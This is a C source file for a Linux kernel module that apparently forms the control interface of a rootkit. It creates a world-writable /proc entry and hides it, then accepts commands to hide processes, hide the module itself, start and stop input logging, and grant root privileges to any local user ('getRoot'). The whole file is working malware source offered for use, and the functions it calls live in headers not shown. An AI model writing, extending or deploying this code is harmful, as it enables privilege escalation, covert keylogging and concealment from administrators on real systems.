#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/module.h>
#include <asm/uaccess.h>  //for put_user / get_user
#include <linux/user.h>
#include <linux/kernel.h>

#include "communication.h"
#include "communicationOutput.h"
#include "processHider.h"
#include "hideProcEntry.h"
#include "moduleHide.h"
#include "logInput.h"
#include "common.h"
#include "getRoot.h"

static void displayHelp(void);
static void handleCommand(char *input);

//TODO: ensure its possible to communicate with the rootkit without being root


// based on http://stackoverflow.com/questions/8516021/proc-create-example-for-kernel-module

// Constants
#define PARENT_PROC_ENTRY  NULL
#define PROC_ENTRY_MODE    0666 // read and write

//TODO: rename this
static const char *PROC_FILE_NAME = PROC_ENTRY;

// Function prototyps
static ssize_t receiveWrite(struct file *, const char __user *, size_t, loff_t *);

//Variables
static struct proc_dir_entry *proc_file_entry;

//TODO: test continually using the entry in proc e.g. cat it while uninstalling the rookit

static const struct file_operations proc_file_fops = {
	//TODO: fill these in
	.owner = THIS_MODULE,
	.write = receiveWrite,
	//.open  = open_callback,
	.read  = sendOutputToUser,
};


int communication_init(void) {
	int error;

	proc_file_entry = proc_create(PROC_FILE_NAME, PROC_ENTRY_MODE, PARENT_PROC_ENTRY, &proc_file_fops);

	if (proc_file_entry == NULL) {
		return -ENOMEM;
	}

	error = hideProcEntry_init();


	return error;
}

void communication_exit(void) {
	remove_proc_entry(PROC_FILE_NAME, PARENT_PROC_ENTRY);

	hideProcEntry_exit(); //note if this starts to depend on the proc entry ensure this is run BEFORE REMOVING THE PROC ENTRY
}

#define ROOTKIT_BUFFER_LENGTH 100

static ssize_t receiveWrite(struct file *file, const char *userBuffer, size_t len, loff_t *off) {
	char kernelBuffer[ROOTKIT_BUFFER_LENGTH];

	if (len >= ROOTKIT_BUFFER_LENGTH) {
		printError("Sorry, too much data was written to proc\n");
		return -EINVAL;
	}

	{
		// strncpy_from_user - http://www.ibm.com/developerworks/library/l-kernel-memory-access/  http://www.gnugeneration.com/mirrors/kernel-api/r4343.html
		int result = strncpy_from_user(kernelBuffer, userBuffer, len);
		if (result < 0) {
			return result;
		}
		kernelBuffer[len] = '\0';
	}

	printInfo("command: %s", kernelBuffer);

	handleCommand(kernelBuffer);

	return len;
}



static void handleCommand(char *input) {
	int arg;
	char *newline;

	newline = strchr(input, '\n');
	if (newline != NULL) {
		*newline = '\0';
	}
	if (sscanf(input, "hidePid %d", &arg) == 1) {
		hideProcess(arg);
	} else if (sscanf(input, "showPid %d", &arg) == 1) {
		showProcess(arg);
	} else if (!strcmp(input, "showModule")) {
		moduleHide_stop();
	} else if (!strcmp(input, "hideModule")) {
		moduleHide_start();
	} else if (!strcmp(input, "startLog")) {
		logInput_init();
	} else if (!strcmp(input, "stopLog")) {
		logInput_exit();
	} else if (!strcmp(input, "getRoot")) {
		getRoot();
	} else if (!strcmp(input, "help")) {
		displayHelp();
	} else {
		addStringToOutputDevice("command not recognised\n");
	}

	//TODO: add a command to display hidden pids
}

static void displayHelp(void) {
	char *helpMessage =
		"help\n"
		"commands are: hidePid, showPid, startLog, stopLog, hideModule, showModule, getRoot, help\n";
	addStringToOutputDevice(helpMessage);
}

